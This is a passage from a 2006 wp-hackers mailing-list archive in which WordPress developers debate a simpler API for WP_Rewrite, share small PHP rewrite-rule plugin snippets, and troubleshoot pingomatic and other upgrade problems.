moments, plugins use $wp_rewrite, and if we refactor that then we'll
likely break them. Adding in a level of abstraction (and getting the
small number of plugin authors that currently use $wp_rewrite) means
we can refactor at a later date.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dmhouse at gmail.com  Sun Feb  5 21:31:45 2006
From: dmhouse at gmail.com (David House)
Date: Sun Feb  5 21:33:11 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <ebe43d680602051318v2acac770t@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com> <43E6667C.5040208@ftwr.co.uk>
	<ebe43d680602051318v2acac770t@mail.gmail.com>
Message-ID: <ebe43d680602051331q38d55e25s@mail.gmail.com>

On 05/02/06, David House <dmhouse@gmail.com> wrote:
> Perhaps it is, but I think we should add the API in first. At the
> moments, plugins use $wp_rewrite, and if we refactor that then we'll
> likely break them. Adding in a level of abstraction (and getting the
> small number of plugin authors that currently use $wp_rewrite) means
> we can refactor at a later date.

If anyone wants to add functions/edit stuff please do it at the wiki
page I've just set up to hold the specification for this API [1]. If
you add anything controversial mention it here as well so we can
discuss it.

[1]: http://codex.wordpress.org/User:DavidHouse/WP_Rewrite_API

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From wp at igeek.info  Sun Feb  5 22:06:58 2006
From: wp at igeek.info (Amit Gupta)
Date: Sun Feb  5 22:08:35 2006
Subject: [wp-hackers] pingomatic problem?
References: <43E3A92F.1050702@skippy.net>
	<43E3C961.4020504@tamba2.org.uk><00a401c6290a$d61d8b30$57ebd4cb@unicorn>
	<331E7BFC-902C-422C-B3C7-3B90A0014FA3@kouloumbris.com>
Message-ID: <002f01c62aa0$7e2de9f0$57ebd4cb@unicorn>

CK <c@kouloumbris.com> wrote:
|  I don't know if this is relevant or not, but it looks like a problem
|  I am having. When I am Saving a post or posting a comment into the
|  blog, in firefox it asks me to save  the corresponding .php file. In
|  Safari i get a white page. On the post part the post has been saved
|  but on the comment part it wasn't published and sometimes i have to
|  press publish 3 times or more to get the comment on the post.

looks like a server problem to me, in handling of file types. which
WordPress version are you using? I'm having my problem in WP1.5.2

------------
Amit Gupta
http://www.amitgupta.in/
http://igeek.info/  ||  http://blog.igeek.info/
http://blog.igeek.info/wp-plugins/igsyntax-hiliter
From kimmo+key+wordpress.c4f53f at suominen.com  Sun Feb  5 22:15:50 2006
From: kimmo+key+wordpress.c4f53f at suominen.com (Kimmo Suominen)
Date: Sun Feb  5 22:17:21 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <43E6667C.5040208@ftwr.co.uk>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com> <43E6667C.5040208@ftwr.co.uk>
Message-ID: <20060205221550.GP1070@kimmo.suominen.com>

On Sun, Feb 05, 2006 at 08:56:28PM +0000, Peter Westwood wrote:
> What do people think of this.

While working on this file, all those little English words should
be wrapped in __() so that they can be translated.  Please?

Best regards,
+ Kimmo
-- 
<A HREF="http://kimmo.suominen.com/">Kimmo Suominen</A>

From c at kouloumbris.com  Sun Feb  5 22:56:39 2006
From: c at kouloumbris.com (CK)
Date: Sun Feb  5 22:58:06 2006
Subject: [wp-hackers] pingomatic problem?
In-Reply-To: <002f01c62aa0$7e2de9f0$57ebd4cb@unicorn>
References: <43E3A92F.1050702@skippy.net>
	<43E3C961.4020504@tamba2.org.uk><00a401c6290a$d61d8b30$57ebd4cb@unicorn>
	<331E7BFC-902C-422C-B3C7-3B90A0014FA3@kouloumbris.com>
	<002f01c62aa0$7e2de9f0$57ebd4cb@unicorn>
Message-ID: <102CC9E7-498D-4B48-9167-C68C88E335E6@kouloumbris.com>


On 5 Feb 2006, at 22:06, Amit Gupta wrote:
> looks like a server problem to me, in handling of file types. which
> WordPress version are you using? I'm having my problem in WP1.5.2

I am having this in two separate installations of wp2.0.1

Constantinos

--
GPG: 0x2502604D
http://kouloumbris.com

"A bus station is where a bus stops. A train station is where a train  
stops. On my desk, I have a workstation?go figure."
~ Steven Wright ~


From wphackers at jamietalbot.com  Sun Feb  5 23:34:39 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Sun Feb  5 23:36:29 2006
Subject: [wp-hackers] Posts time out and make duplicate posts
In-Reply-To: <BAY101-W1031F3CC9BB6C5273299DB930F0@phx.gbl>
References: <BAY101-W1031F3CC9BB6C5273299DB930F0@phx.gbl>
Message-ID: <43E68B8F.6090609@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Donnie La Curan wrote:
> Ever since I updated to 2.0.1 I have noticed that making a post takes a really long time.
> Sometimes long enough that I get the cannot find server error.  I just go back to the main screen
> of my blog and the post is there, twice.  Sometimes it doesn't time out, but I still get
> duplicate posts and I have to go in and delete the extra one.  Version 2.0 worked just fine,
> didn't take too long to make a post and it never created duplicate posts.

The first thing to do is to remove the reference to pingomatic in the Update Service box on
Options->Writing.  Some people have reported having some problems with it recently.  See if that
fixes it for you.

Cheers,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD5ouOrovxfShShFARAsb3AJ0VLcKKpuoaNT90H5gCcd26+OnbVQCgkBTN
Xz8xWafc6xbKyiRoKyQjXIk=
=Y5H4
-----END PGP SIGNATURE-----
From aaron at technosailor.com  Sun Feb  5 17:15:18 2006
From: aaron at technosailor.com (Aaron Brazell)
Date: Sun Feb  5 23:39:14 2006
Subject: [wp-hackers] WordPress Importer (Cross-Post)
In-Reply-To: <43E61C39.5060601@jamietalbot.com>
Message-ID: <20060205233907.AAB7E61B8@comox.textdrive.com>


> As a side-issue, I want to place a checkbox next to the Delete Button on
> the edit page.  I added it
> in edit_form_advanced with javascript to append it in the right place, but
> IE dies with a fatal
> error every time.  Apparently, it doesn't like the DOM being altered
> before the page is fully
> loaded, which I think is because the preview pane is still loading at that
> time.  Anybody think of a
>  way to do this?
> 
> Cheers,
> 
> Jamie.
> 
> PS: Don't mention hijack, or you'll go on "The List"!

Hijacked Twice.

From sam at rephrase.net  Sun Feb  5 23:49:40 2006
From: sam at rephrase.net (Sam Angove)
Date: Sun Feb  5 23:51:05 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <ebe43d680602050736s48b87e46l@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
Message-ID: <aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>

On 2/6/06, David House <dmhouse@gmail.com> wrote:
> Reading through the recent thread concerning Scott Merril's troubles
> with WP_Rewrite [1], I thought that we really should automate a lot of
> what is in the final plugin [2].

I think we should arrange some clear code examples. Ryan's is great,
but it doesn't suit every use-case.

Are there any other hooks/filters that get convenience wrappers?
They're pretty convenient as-is. The current way is very flexible, and
it only looks verbose when it's for the sake of one query var -- I had
a plugin with about eight, and three times that many rewrite rules,
and it was very nice indeed.

Scott's plugin is only complicated because there's no good place to
modify other query variables -- changing the query string is hackish,
and parse_query might be too late if the wrong is_* variables have
already been set -- and it modifies the post permalink. The latter, at
least, can't be easily simplified.

> ----------------------------------------------------------------------------
> 1. add_rewrite_rule(): A function for adding a straight rewrite rule.
>
> [snip]
> * Theoretically it could then filter rewrite_rules_array and add the
> rules itself, but I think we should add a function to WP_Rewrite for
> adding 'extra' rules that needn't be generated by
> generate_rewrite_rules().

I don't have a problem with it, but why is filtering the array so bad?
The current way is very easy, and it's more elegant for adding
multiple rules.

function add_arbitrary_rules($rules) {
    $url = get_settings('home');
    $rules[$url.'/arbitrary/(wibble)/?$'] = 'index.php?var=$matches[1]';
    $rules[$url.'/arbitrary/(wobble)/?$'] = 'index.php?var=$matches[1]';
    return $rules;
}
add_filter('rewrite_rules_array', 'add_arbitrary_rules');



> ----------------------------------------------------------------------------
> 2. add_rewrite_tag(): Add a new tag (like %postname%):
>
> What it needs to do:
> * Get a query var name by stripping the % signs from the name of the
> tag: trim($name, '%')
> * Call $wp_rewrite->add_rewrite_tag() with the name, generated QV name
> and regex.
> * Add the QV as a query var (again, this could be done by filtering
> query_vars but it might be nicer to add a function to the WP class
> that stores 'extra' QVs like above)

Without your callback, does this do enough to make it worth the
bother? The query_vars filter is the easy bit anyway, and this API is
much less efficient if you're adding more than one QV.

Not a code reason, but FWIW I like having registration of query vars
separate since it makes the author more likely to remember to use
get_query_var() instead of $_GET. Since in my case that author is me,
aids to memory are very, very welcome... ;)
From sam at rephrase.net  Mon Feb  6 00:17:59 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Feb  6 00:19:25 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <43E6667C.5040208@ftwr.co.uk>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com> <43E6667C.5040208@ftwr.co.uk>
Message-ID: <aa74b1910602051617h18027b93l24b6658e4b4082c@mail.gmail.com>

On 2/6/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>
> I am getting to know it quite well at the moment trying to put together
> a patch for this old trac ticket - http://trac.wordpress.org/ticket/301
> (current inprogress patch attached)

It'll clutter the interface something shocking. I agree with that
ticket inasmuch as there should be more tokens used, though -- %page%
instead of hard-coded /page/, %trackback%, %attachment%, %date% etc.
For i18n if nothing else.

You can change the bases via plugin; here's one with no admin interface:

<?php
/*
Plugin Name: Ace of Base
*/

class AllYourBase {
	function change_of_base() {
		global $wp_rewrite;
		$wp_rewrite->feed_base = 'dinner';
		$wp_rewrite->author_base = 'hemingway';
		$wp_rewrite->comments_base = 'gossip';
		$wp_rewrite->search_base = 'mountainview';
	}
}
add_filter( 'init', array('AllYourBase', 'change_of_base') );
?>
From sam at rephrase.net  Mon Feb  6 00:37:34 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Feb  6 00:39:00 2006
Subject: [wp-hackers] WP_Rewrite query
In-Reply-To: <43E60CBF.5000804@skippy.net>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E4312D.2040405@robm.me.uk>
	<e6ec604d0602032300x2fd7dc6dpaa4ad4ce302ff48b@mail.gmail.com>
	<43E4D80B.8010003@robm.me.uk>
	<e6ec604d0602041439o3f290212ked3e03d373065df7@mail.gmail.com>
	<43E536DF.90303@skippy.net>
	<e6ec604d0602041527h1b69d278p645412f9a9594a7a@mail.gmail.com>
	<43E563FC.8050306@skippy.net>
	<aa74b1910602041946k5d1ed9d1j460958fbe591110f@mail.gmail.com>
	<43E60CBF.5000804@skippy.net>
Message-ID: <aa74b1910602051637s2e0a654cqc8e924e567957bb0@mail.gmail.com>

On 2/6/06, Scott Merrill <skippy@skippy.net> wrote:
>
> Thanks, Sam!  This is _precisely_ what I needed.  Do you have a PayPal
> account?

Of course I do, but I'm not going to pay you for the privilege, if
that's what you're suggesting! </outrage> Whatever happened to doing
things for the love of your fellow man? :P

> For those following along at home, here's my revision to Sam's plugin,
> which should account for leap years:
>    http://www.skippy.net/secret/dayofyear.phps

I know it was in mine too, but filter_day_link() won't actually work
as advertised. The get_(month|year|day)_link() functions will all
return /date/%year%/%monthnum%/%day%/ permalinks.
From wp at ebroder.net  Mon Feb  6 00:58:24 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Feb  6 00:59:50 2006
Subject: [wp-hackers] URL Rewriting and HTTP Authentication
Message-ID: <43E69F30.10207@ebroder.net>

  Hi, all.

It seems that whenever I try to require HTTP authentication for a folder 
(i.e. through .htaccess), the URL rewrite rules cause page requests to 
that directory to be redirected to WP, where I then get a 404 error.

I'm no mod_rewrite expert, so I don't really know what's causing it. I'm 
hosted at site5 and don't think I have access to the Apache logs, so I 
can't tell what's going on there. There was a support thread at 
http://wordpress.org/support/topic/55033 of people having similar 
problems with DreamHost. I created a trac ticket - #2397.

Hope this all helps, and let me know if I can provide any other information.

- Evan Broder
From peter.westwood at ftwr.co.uk  Mon Feb  6 06:25:17 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon Feb  6 06:26:51 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <aa74b1910602051617h18027b93l24b6658e4b4082c@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>	<43E639FE.6010606@midnightcircus.com>
	<43E6667C.5040208@ftwr.co.uk>
	<aa74b1910602051617h18027b93l24b6658e4b4082c@mail.gmail.com>
Message-ID: <43E6EBCD.1060104@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sam Angove wrote:
> On 2/6/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>> I am getting to know it quite well at the moment trying to put together
>> a patch for this old trac ticket - http://trac.wordpress.org/ticket/301
>> (current inprogress patch attached)
> 
> It'll clutter the interface something shocking. I agree with that
> ticket inasmuch as there should be more tokens used, though -- %page%
> instead of hard-coded /page/, %trackback%, %attachment%, %date% etc.
> For i18n if nothing else.
> 
> You can change the bases via plugin; here's one with no admin interface:
> 
> <?php
> /*
> Plugin Name: Ace of Base
> */
> 
> class AllYourBase {
> 	function change_of_base() {
> 		global $wp_rewrite;
> 		$wp_rewrite->feed_base = 'dinner';
> 		$wp_rewrite->author_base = 'hemingway';
> 		$wp_rewrite->comments_base = 'gossip';
> 		$wp_rewrite->search_base = 'mountainview';
> 	}
> }
> add_filter( 'init', array('AllYourBase', 'change_of_base') );
> ?>

This will work _except_ for feeds.  The rewrite rules for feeds expect
the feed_base to be feed and don't match when it is changed - you end up
with the feed links 404'ing.

This is the part of the patch that has been causing me the most grief
but I'm getting there.

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD5uvNVPRdzag0AcURAtRYAJ0elU+YoQAMI7WRf/IOj6N1LhgzyACgzU9z
6764hIr+KWt3D/uqJZ9t4jE=
=UYqh
-----END PGP SIGNATURE-----

From peter.westwood at ftwr.co.uk  Mon Feb  6 06:35:00 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon Feb  6 06:36:22 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>
Message-ID: <43E6EE14.4020702@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sam Angove wrote:
>> ----------------------------------------------------------------------------
>> 1. add_rewrite_rule(): A function for adding a straight rewrite rule.
>>
>> [snip]
>> * Theoretically it could then filter rewrite_rules_array and add the
>> rules itself, but I think we should add a function to WP_Rewrite for
>> adding 'extra' rules that needn't be generated by
>> generate_rewrite_rules().
> 
> I don't have a problem with it, but why is filtering the array so bad?
> The current way is very easy, and it's more elegant for adding
> multiple rules.
> 
> function add_arbitrary_rules($rules) {
>     $url = get_settings('home');
>     $rules[$url.'/arbitrary/(wibble)/?$'] = 'index.php?var=$matches[1]';
>     $rules[$url.'/arbitrary/(wobble)/?$'] = 'index.php?var=$matches[1]';
>     return $rules;
> }
> add_filter('rewrite_rules_array', 'add_arbitrary_rules');
>

Doing things this way breaks when we need index.php/permalinks/ the
whole reason for providing an API is that WP_Rewrite can take care of
the nasty stuff like that and let you get on with writing your plugin.

This level of abstraction is usefull, and opens up the addition of rule
types to more plugin developers - they need not understand PCRE to add a
new endpoint type for example.

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD5u4UVPRdzag0AcURAtDqAJ4kekm61ghbRyIiv72IuGe6B5Cy/gCfSS3u
Gq8cYEI3OP2qpRFDRqJ5MUQ=
=ip0S
-----END PGP SIGNATURE-----

From peter.westwood at ftwr.co.uk  Mon Feb  6 06:35:58 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon Feb  6 06:37:26 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <ebe43d680602051331q38d55e25s@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>	<43E639FE.6010606@midnightcircus.com>
	<43E6667C.5040208@ftwr.co.uk>	<ebe43d680602051318v2acac770t@mail.gmail.com>
	<ebe43d680602051331q38d55e25s@mail.gmail.com>
Message-ID: <43E6EE4E.4050508@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

David House wrote:
> On 05/02/06, David House <dmhouse@gmail.com> wrote:
>> Perhaps it is, but I think we should add the API in first. At the
>> moments, plugins use $wp_rewrite, and if we refactor that then we'll
>> likely break them. Adding in a level of abstraction (and getting the
>> small number of plugin authors that currently use $wp_rewrite) means
>> we can refactor at a later date.
> 
> If anyone wants to add functions/edit stuff please do it at the wiki
> page I've just set up to hold the specification for this API [1]. If
> you add anything controversial mention it here as well so we can
> discuss it.
> 
> [1]: http://codex.wordpress.org/User:DavidHouse/WP_Rewrite_API

I added a few suggestions to this last night

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFD5u5OVPRdzag0AcURAovHAKCSohVOIljq1bgCtaaMeFknxzhoQACdFSWt
TsxUY1Yv76T6jnCZG0tpGac=
=TwqF
-----END PGP SIGNATURE-----

From peter.westwood at ftwr.co.uk  Mon Feb  6 08:31:56 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon Feb  6 08:33:28 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <43E6EE14.4020702@ftwr.co.uk>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>
	<43E6EE14.4020702@ftwr.co.uk>
Message-ID: <59875.193.128.96.1.1139214716.squirrel@epia.ftwr.co.uk>


On Mon, February 6, 2006 6:35 am, Peter Westwood wrote:
> Sam Angove wrote:
>>> ----------------------------------------------------------------------------
>>> 1. add_rewrite_rule(): A function for adding a straight rewrite rule.
>>>
>>> [snip]
>>> * Theoretically it could then filter rewrite_rules_array and add the
>>> rules itself, but I think we should add a function to WP_Rewrite for
>>> adding 'extra' rules that needn't be generated by
>>> generate_rewrite_rules().
>>
>> I don't have a problem with it, but why is filtering the array so bad?
>> The current way is very easy, and it's more elegant for adding
>> multiple rules.
>>
>> function add_arbitrary_rules($rules) {
>>     $url = get_settings('home');
>>     $rules[$url.'/arbitrary/(wibble)/?$'] = 'index.php?var=$matches[1]';
>>     $rules[$url.'/arbitrary/(wobble)/?$'] = 'index.php?var=$matches[1]';
>>     return $rules;
>> }
>> add_filter('rewrite_rules_array', 'add_arbitrary_rules');
>>
>
> Doing things this way breaks when we need index.php/permalinks/ the
> whole reason for providing an API is that WP_Rewrite can take care of
> the nasty stuff like that and let you get on with writing your plugin.
>

Scratch that comment..  I realised on my way into work this morning that
I'm talking rubbish here.  Thats what I get for replying to emails at 6:30
in the morning five minutes after I wake up :-(

> This level of abstraction is usefull, and opens up the addition of rule
> types to more plugin developers - they need not understand PCRE to add a
> new endpoint type for example.
>

This point is still valid though :-)

westi
-- 
Peter Westwood
Blog: http://blog.ftwr.co.uk

From sam at rephrase.net  Mon Feb  6 09:31:34 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Feb  6 09:33:02 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <43E6EBCD.1060104@ftwr.co.uk>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com> <43E6667C.5040208@ftwr.co.uk>
	<aa74b1910602051617h18027b93l24b6658e4b4082c@mail.gmail.com>
	<43E6EBCD.1060104@ftwr.co.uk>
Message-ID: <aa74b1910602060131g6bd55905ycfb7e047b0f6e979@mail.gmail.com>

On 2/6/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>
> This will work _except_ for feeds.  The rewrite rules for feeds expect
> the feed_base to be feed and don't match when it is changed - you end up
> with the feed links 404'ing.

Hmm, I see what you mean. Though I'm more inclined to say that
get_feed_link() is broken if the feed is RSS2. Of course, you can
always work around it... ;)

function fix_broken_get_feed_link($rules) {
	global $wp_rewrite;
	$base = $wp_rewrite->feed_base;
	$comment_base = $wp_rewrite->comments_base;
	$rules["$base/?"] = 'index.php?feed=rss2';
	$rules["$comment_base/$base/?"] = 'index.php?feed=rss2&withcomments=1';
	return $rules;
}
add_filter( 'rewrite_rules_array', 'fix_broken_get_feed_link');
From peter.westwood at ftwr.co.uk  Mon Feb  6 09:52:39 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon Feb  6 09:54:17 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <aa74b1910602060131g6bd55905ycfb7e047b0f6e979@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com> <43E6667C.5040208@ftwr.co.uk>
	<aa74b1910602051617h18027b93l24b6658e4b4082c@mail.gmail.com>
	<43E6EBCD.1060104@ftwr.co.uk>
	<aa74b1910602060131g6bd55905ycfb7e047b0f6e979@mail.gmail.com>
Message-ID: <31781.193.128.96.1.1139219559.squirrel@epia.ftwr.co.uk>

On Mon, February 6, 2006 9:31 am, Sam Angove wrote:
> On 2/6/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>>
>> This will work _except_ for feeds.  The rewrite rules for feeds expect
>> the feed_base to be feed and don't match when it is changed - you end up
>> with the feed links 404'ing.
>
> Hmm, I see what you mean. Though I'm more inclined to say that
> get_feed_link() is broken if the feed is RSS2. Of course, you can
> always work around it... ;)
>
> function fix_broken_get_feed_link($rules) {
> 	global $wp_rewrite;
> 	$base = $wp_rewrite->feed_base;
> 	$comment_base = $wp_rewrite->comments_base;
> 	$rules["$base/?"] = 'index.php?feed=rss2';
> 	$rules["$comment_base/$base/?"] = 'index.php?feed=rss2&withcomments=1';
> 	return $rules;
> }
> add_filter( 'rewrite_rules_array', 'fix_broken_get_feed_link');

Don't forget that you need to do this for _every_ post/page permalink
rewrite rule as well it's not just the root feed that is broken.

This is why WP_Rewrite needs fixing to support this rather than trying to
hack arround it.

westi
-- 
Peter Westwood
Blog: http://blog.ftwr.co.uk

From sam at rephrase.net  Mon Feb  6 09:57:53 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Feb  6 09:59:17 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <43E6EE14.4020702@ftwr.co.uk>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>
	<43E6EE14.4020702@ftwr.co.uk>
Message-ID: <aa74b1910602060157r68029fa7nc99da7fe0cdc7554@mail.gmail.com>

On 2/6/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
> Doing things this way breaks when we need index.php/permalinks/ the
> whole reason for providing an API is that WP_Rewrite can take care of
> the nasty stuff like that and let you get on with writing your plugin.

I was actually going to suggest prepending `index.php` globally (and
converting $1 to $matches[1], etc) after the array filter, instead of
one at a time during `generate_rewrite_rules()`.

But you're right, that is a good reason.


> This level of abstraction is usefull, and opens up the addition of rule
> types to more plugin developers - they need not understand PCRE to add a
> new endpoint type for example.

True (for your proposed add_endpoint() function), but they'll still
need to understand them to use add_rewrite_rule().

Something much more abstracted might be interesting...
   add_rewrite_rule('%tag%/%tag2%', 'index.php?a=%tag%&b=%tag2%');
From sam at rephrase.net  Mon Feb  6 10:03:06 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Feb  6 10:04:32 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <31781.193.128.96.1.1139219559.squirrel@epia.ftwr.co.uk>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<43E639FE.6010606@midnightcircus.com> <43E6667C.5040208@ftwr.co.uk>
	<aa74b1910602051617h18027b93l24b6658e4b4082c@mail.gmail.com>
	<43E6EBCD.1060104@ftwr.co.uk>
	<aa74b1910602060131g6bd55905ycfb7e047b0f6e979@mail.gmail.com>
	<31781.193.128.96.1.1139219559.squirrel@epia.ftwr.co.uk>
Message-ID: <aa74b1910602060203r19a60250sd387b5f44b4c6c67@mail.gmail.com>

On 2/6/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>
> Don't forget that you need to do this for _every_ post/page permalink
> rewrite rule as well it's not just the root feed that is broken.
>
> This is why WP_Rewrite needs fixing to support this rather than trying to
> hack arround it.

Unless it's been changed since 2.0 (haven't upgraded yet), the
comments_rss function will always return permalink/feed/, which will
still work.

permalink/rss2/, permalink/atom/ etc. will work too -- as will
permalink/feed_base/(feed|rss2|rss|atom).
From dmhouse at gmail.com  Mon Feb  6 11:04:48 2006
From: dmhouse at gmail.com (David House)
Date: Mon Feb  6 11:06:16 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>
Message-ID: <ebe43d680602060304i25185790r@mail.gmail.com>

On 05/02/06, Sam Angove <sam@rephrase.net> wrote:
> Are there any other hooks/filters that get convenience wrappers?
> They're pretty convenient as-is. The current way is very flexible, and
> it only looks verbose when it's for the sake of one query var -- I had
> a plugin with about eight, and three times that many rewrite rules,
> and it was very nice indeed.

<snip>

> Without your callback, does this do enough to make it worth the
> bother? The query_vars filter is the easy bit anyway, and this API is
> much less efficient if you're adding more than one QV.

Are you proposing we give up on the API idea? Here's why I think it's necessary:

1) Plugin authors want a simple solution to a simple problem. Adding,
say, a single rewrite rule is a simple problem and so we should
provide a simple function for it.
2) It gives us a level of abstraction so we can refactor WP_Rewrite at
a later date without worrying about breaking the plugin-facing
interface.

I just think that having to hook three or more filters to add a new
rewrite tag is too much. It may not seem unbearable when you have
eight QVs, but I'd think that yours is the edge case and skippy's more
normal.

Something like the example I pointed out [1] illustrates the power of
just the two simple functions I proposed. Westi's would make
everything a lot more flexible.

I don't see any reason not to add the API.

I'll probably be drafting up patches for add_rewrite_rule() and
add_rewrite_tag() over the next few days (with the others following)
unless anyone disagrees.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From mark at phunky.co.uk  Mon Feb  6 12:40:42 2006
From: mark at phunky.co.uk (Mark Harwood)
Date: Mon Feb  6 12:40:24 2006
Subject: [wp-hackers] WP No longer display user emails
Message-ID: <43E743CA.2060707@phunky.co.uk>

Hi, posted this on the support forum also but not getting any replys so 
i thought id ask the hackers mailing list to see if anyone else has been 
getting this too...

Since upgrading WP2 to WP2.01 it would seem that get_currentuserinfo() 
and get_userdata() no longer pull back the users email address.

Is there any known issuse with this? As it will still update the email 
if you change it via the user admin but just will not display the email 
in the form feild as it is not pulling it from the DB with the two above 
functions

Many Thanks
Mark 'Phunky' Harwood
Founder of EuroCSS.NET

From sam at rephrase.net  Mon Feb  6 12:54:30 2006
From: sam at rephrase.net (Sam Angove)
Date: Mon Feb  6 12:55:55 2006
Subject: [wp-hackers] Make WP_Rewrite eaiser to use
In-Reply-To: <ebe43d680602060304i25185790r@mail.gmail.com>
References: <ebe43d680602050736s48b87e46l@mail.gmail.com>
	<aa74b1910602051549h74a595b7g249564f6c58a97b9@mail.gmail.com>
	<ebe43d680602060304i25185790r@mail.gmail.com>
Message-ID: <aa74b1910602060454t280a2eb0xb299e5776eb59490@mail.gmail.com>

On 2/6/06, David House <dmhouse@gmail.com> wrote:
>
> Are you proposing we give up on the API idea?

No. But I'm not sure this is the *right* API idea. Yes, my
super-complicated multi-var plugin was an edge case, but almost
certainly so is someone wanting to add a single arbitrary rewrite
rule.

I don't think the proposed API simplifies *enough*, because the
implementations it replaces aren't very hard -- just mostly
undocumented. I think it's better to dramatically simplify the few
most obvious cases, inflexible as that may be, and leave the rest to
the current super-flexible love love plugin API.


* post permalink tag (i.e. Skippy's problem).
 The ideal solution there is a callback and automatic filtering on
'post_link'. Even better would be a global $rewritereplace array used
for every link, removing the need for explicit filters on post_link
and year_link and day_link and page_link and the dozen others.


* plugin page redirect
 This is the *only* use I can imagine for a single arbitrary rewrite
rule. Probably a redirect from $home/somename/ to
index.php?do_my_plugin_thang=true, which will in turn lead to some
kind of template. Ideally these people don't need to register query
vars at all, since they could (should) all be sharing some
API-controlled "plugin_page" var. [^1]


* adding tags to the end of post permalinks, i.e. westi's add_endpoint()
  I have two plugins that use something like this to load custom post
templates, so obviously I like it. [^1]


[^1] What's the best practice for templates? Embedded like the new
plugin admin pages? In themes? In a plugin's own directory? Special
location in wp-content? If the API enforces a certain way then it'll
be adopted.


I don't see add_feed() as primarily a rewrite thing, but it's a good
idea and there's no reason not to have it. add_base(), not so much.
From dstewart at atl.lmco.com  Mon Feb  6 15:40:29 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Mon Feb  6 15:42:12 2006
Subject: [wp-hackers] Wiki Wiki WordPress
In-Reply-To: <5a715c0a0602040539w63815d20n7e74e8218172a2fc@mail.gmail.com>
